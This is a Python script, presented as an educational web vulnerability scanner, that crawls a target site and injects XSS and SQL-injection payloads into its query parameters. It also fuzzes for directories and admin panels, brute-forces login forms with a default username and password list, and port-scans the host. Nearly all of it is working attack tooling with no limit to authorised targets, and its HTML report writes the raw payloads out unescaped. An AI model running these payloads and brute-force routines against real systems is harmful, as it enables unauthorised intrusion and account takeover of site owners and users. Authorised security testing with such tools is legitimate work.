import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
import socket
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet

# -------- CONFIG DEFAULT --------
DIRECTORY_WORDLIST = ["admin", "login", "dashboard", "backup", "config", "test"]
ADMIN_PANELS = ["admin", "administrator", "cpanel", "manage", "dashboard"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]
SQL_PAYLOADS = ["' OR '1'='1", "' UNION SELECT NULL--", "\" OR \"1\"=\"1"]
USERNAME_LIST = ["admin", "user", "test", "root"]
PASSWORD_LIST = ["admin", "123456", "password", "root", "toor", "test"]

visited_links = set()
scan_results = []

# -------- LOGGING --------
def log_result(msg):
    print(msg)
    scan_results.append(msg)
    with open("scan_result.txt", "a", encoding="utf-8") as f:
        f.write(msg + "\n")

# -------- BUG TEST --------
def test_xss(url, params):
    for key in params:
        for payload in XSS_PAYLOADS:
            new_params = params.copy()
            new_params[key] = payload
            try:
                r = requests.get(url, params=new_params, timeout=5)
                if payload in r.text:
                    log_result(f"[XSS] {url} | Param: {key} | Payload: {payload}")
            except: pass

def test_sql(url, params):
    for key in params:
        for payload in SQL_PAYLOADS:
            new_params = params.copy()
            new_params[key] = payload
            try:
                r = requests.get(url, params=new_params, timeout=5)
                if any(err in r.text.lower() for err in ["sql", "syntax", "mysql", "odbc", "oracle"]):
                    log_result(f"[SQLi] {url} | Param: {key} | Payload: {payload}")
            except: pass

# -------- FUZZ DIRECTORIES --------
def fuzz_directories(base_url):
    log_result("\n[+] Fuzzing direktori ...")
    for path in DIRECTORY_WORDLIST:
        test_url = f"{base_url}/{path}/"
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code == 200:
                log_result(f"[DIR] Ditemukan: {test_url}")
        except: pass

# -------- ADMIN PANEL SCAN --------
def find_admin_panels(base_url):
    log_result("\n[+] Mencari admin panel ...")
    for path in ADMIN_PANELS:
        test_url = f"{base_url}/{path}/"
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code == 200:
                log_result(f"[ADMIN] Panel ditemukan: {test_url}")
        except: pass

# -------- LOGIN BRUTE FORCE --------
def brute_force_login(url):
    log_result("\n[+] Brute-force login ...")
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        if not form: return
        action = form.get("action")
        method = form.get("method", "get").lower()
        form_url = urljoin(url, action)
        inputs = form.find_all("input")
        data = {i.get("name"): "" for i in inputs if i.get("name")}
        username_field, password_field = None, None
        for name in data.keys():
            if "user" in name.lower(): username_field = name
            if "pass" in name.lower(): password_field = name
        if not username_field or not password_field: return
        for user in USERNAME_LIST:
            for pwd in PASSWORD_LIST:
                data[username_field] = user
                data[password_field] = pwd
                if method == "post":
                    resp = requests.post(form_url, data=data, timeout=5)
                else:
                    resp = requests.get(form_url, params=data, timeout=5)
                if "logout" in resp.text.lower() or "dashboard" in resp.text.lower():
                    log_result(f"[LOGIN FOUND] {user}:{pwd} -> {form_url}")
                    return
    except: pass

# -------- PORT SCANNER --------
def port_scan(host, ports):
    log_result("\n[+] Port Scan ...")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            if result == 0:
                log_result(f"[PORT OPEN] {host}:{port}")
            sock.close()
        except: pass

# -------- CRAWLER --------
def crawl(url):
    if url in visited_links: return
    visited_links.add(url)
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        for link in soup.find_all("a", href=True):
            new_url = urljoin(url, link["href"])
            if urlparse(new_url).netloc == urlparse(url).netloc:
                crawl(new_url)
        if "?" in url:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if params:
                log_result(f"\n[SCAN] {url} | Param: {list(params.keys())}")
                test_xss(parsed.scheme + "://" + parsed.netloc + parsed.path, params)
                test_sql(parsed.scheme + "://" + parsed.netloc + parsed.path, params)
    except: pass

# -------- REPORT GENERATOR --------
def generate_report():
    # HTML
    with open("scan_report.html", "w", encoding="utf-8") as f:
        f.write("<h1>Scan Report</h1>\n<ul>")
        for line in scan_results:
            f.write(f"<li>{line}</li>\n")
        f.write("</ul>")
    # PDF
    styles = getSampleStyleSheet()
    doc = SimpleDocTemplate("scan_report.pdf")
    story = [Paragraph("Scan Report", styles["Title"]), Spacer(1, 12)]
    for line in scan_results:
        story.append(Paragraph(line, styles["Normal"]))
        story.append(Spacer(1, 6))
    doc.build(story)

# -------- MAIN --------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Web Vulnerability Scanner (Educational)")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--no-fuzz", action="store_true", help="Disable directory fuzzing")
    parser.add_argument("--bruteforce", action="store_true", help="Enable brute force login")
    parser.add_argument("--portscan", action="store_true", help="Enable port scanning")
    parser.add_argument("--ports", default="22,80,443", help="Ports to scan (comma-separated)")
    args = parser.parse_args()

    target = args.target
    host = urlparse(target).netloc

    log_result("[*] Mulai scan target: " + target)
    crawl(target)
    if not args.no_fuzz:
        fuzz_directories(target)
        find_admin_panels(target)
    if args.bruteforce:
        brute_force_login(target)
    if args.portscan:
        ports = [int(p) for p in args.ports.split(",")]
        port_scan(host, ports)
    log_result("[*] Scan selesai. Hasil tersimpan di scan_result.txt, scan_report.html, scan_report.pdf")
    generate_report()